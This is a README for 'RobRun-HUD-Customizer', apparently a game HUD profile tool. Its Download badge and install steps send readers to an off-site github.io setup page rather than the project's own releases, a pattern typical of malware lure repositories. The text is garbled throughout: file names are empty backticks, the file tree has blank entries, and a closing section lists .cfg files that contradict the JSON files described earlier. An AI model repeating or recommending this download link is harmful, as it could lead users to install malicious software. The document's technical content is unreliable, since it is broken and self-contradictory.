# RobRun-HUD-Customizer

Ever wondered how to streamline your in‑game HUD experience without adding extra layers of complexity?
RobRun‑HUD‑Customizer lets you shape, save, and swap display profiles with precision and clarity, keeping every element where you want it, when you need it.

<div style="text-align:center">
<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download-Release-4338ca?style=flat-square&logo=rust&logoColor=white" alt="Download"></a>
<img src="https://img.shields.io/badge/Version-1.4.2-blue?style=flat-square&logo=rust&logoColor=white" alt="Version">
<img src="https://img.shields.io/badge/License-MIT-green?style=plastic&logo=github&logoColor=white" alt="License">
<img src="https://img.shields.io/badge/Build-OK-red?style=for-the-badge&logo=travis&logoColor=white" alt="Build">
<img src="https://img.shields.io/badge/Language-JSON-orange?style=flat&logo=json&logoColor=white" alt="Language">
</div>

---

## Overview

RobRun‑HUD‑Customizer is a structured configuration manager designed to keep your HUD settings organized and transferable.
The project is maintained by **Crestoushovel** and focuses on:

- **Profile creation** – Create a named set of HUD options that can be recalled instantly.
- **Workflow presets** – Pre‑built sequences that apply a set of profiles and tweak environment variables automatically.
- **Sync‑ready bundles** – All files ready for sharing or backup, packaged in a single, lightweight archive.

Each profile lives in its own configuration folder, while global defaults are defined in a shared ``.
The system deliberately avoids any dynamic code execution; all changes are static, declarative, and reproducible.

---

## Features

| Feature | Description | Usage |
|---------|-------------|-------|
| **Structured profiles** | Every HUD element is defined in a JSON key/value pair inside ``. | Edit the file or load a preset via the preset manager. |
| **Player‑specific settings** | The `` holds attributes that vary between characters (e.g., name, rank, or personal preferences). | Store separate `` files per character and load them automatically on launch. |
| **Custom overrides** | `` allows fine‑tuning without altering the core defaults. | Add or overwrite a single setting, e.g., `{"scoreFont": "Arial Bold"}`. |
| **Batch workflow** | A `workflow.json` describes a chain of profile switches, color adjustments, and screen‑alignment routines. | Apply a preset with a single click from the GUI. |
| **Versioned bundles** | Release archives contain all required files, a README, and a checksum file. | Download and unpack to the designated folder. |

All configuration files are located in the `configs/` directory and are human‑readable, making collaboration straightforward.

---

## File Structure

<pre>
RobRun-HUD-Customizer/
├─ configs/
│   ├─
│   ├─
│   ├─
│   ├─
│   ├─ profiles/
│   │   ├─ minimalist/
│   │   │   ├─
│   │   │   └─
│   │   ├─ detailed/
│   │   │   ├─
│   │   │   └─
│   └─ workflows/
│       ├─ night_vision.json
│       └─ full_screen.json
├─ assets/
│   ├─ icons/
│   │   ├─ score.png
│   │   └─ health.png
├─ scripts/
│   ├─ load_profile.sh
│   └─ apply_workflow.sh
└─ README.md
</pre>

Each `profiles/*` folder contains a complete set of `` and `` that represent a fully defined HUD state.
Workflows live in `workflows/` and reference those profiles by name, ensuring consistency.

---

### ``

The baseline configuration.
If a requested setting is missing in ``, the value from `` is used.
This file should rarely be edited directly; prefer creating overrides.

### ``

A lightweight file that only contains the values you want to deviate from the default.
For example:

```json
{"background":"#111111","text":"#DDDDDD"}
```

Only two keys are present; everything else is inherited.

### ``

Defines the visual layout for a specific HUD profile.
All coordinates are relative to the screen's top‑left corner.

### ``

Holds data that changes per player or character, such as:

```json
{"playerName":"CommanderX","rank":"Sergeant","color":"#FF8800"}
```

---

## Workflow Presets

A workflow JSON describes a sequence of actions:

```json
{
  "name":"Night Vision",
  "steps":[
    {"action":"loadProfile","target":"minimalist"},
    {"action":"setColor","target":"background","value":"#004400"},
    {"action":"enableFeature","target":"nightMode","value":true}
  ]
}
```

* `loadProfile` – swaps to the chosen profile.
* `setColor` – overrides a specific color key.
* `enableFeature` – toggles a named feature flag.

The `apply_workflow.sh` script can be invoked with a workflow name and will carry out all steps automatically.

---

## How to Deploy

1. **Acquire the latest bundle**
   Click the Download button above to receive `RobRun-HUD-Customizer-1.4.2.zip`.

2. **Unpack**
   Extract the archive to a location of your choosing; the folder structure is self‑contained.

3. **Select a profile**
   Edit the `` inside the desired profile folder, or use the provided GUI to switch at runtime.

4. **Apply a workflow**
   Run the `apply_workflow.sh` script with the workflow name: `./scripts/apply_workflow.sh night_vision`.

5. **Enjoy**
   Launch the game; the HUD will reflect the applied configuration instantly.

No compilation or installation steps are required—just the configuration files.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **What if the HUD elements do not appear?** | Ensure that the `elements` array in `` references valid element IDs defined in the game’s asset list. Check the `assets/icons/` folder for missing files. |
| **How can I revert to the default layout?** | Delete or rename the `` file. The system will automatically fall back to ``. |
| **My color changes are ignored.** | Confirm that the workflow JSON does not contain a conflicting `setColor` step for the same key. If using ``, ensure the key exists. |
| **Can I share a profile with a teammate?** | Zip the entire `profiles/<name>/` folder and send it. They can drop it into the `profiles/` directory of their own installation. |
| **Does the system support multiple players simultaneously?** | Each player should have a dedicated `` file. Load the corresponding configuration on session start to avoid clashes. |
| **I see an error about missing `logo.json`.** | This is unrelated to the HUD system; it indicates a missing optional branding file. It can be ignored. |

If a problem persists, consult the `scripts/` directory for diagnostic outputs or raise an issue on the repository’s issue tracker.

---

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```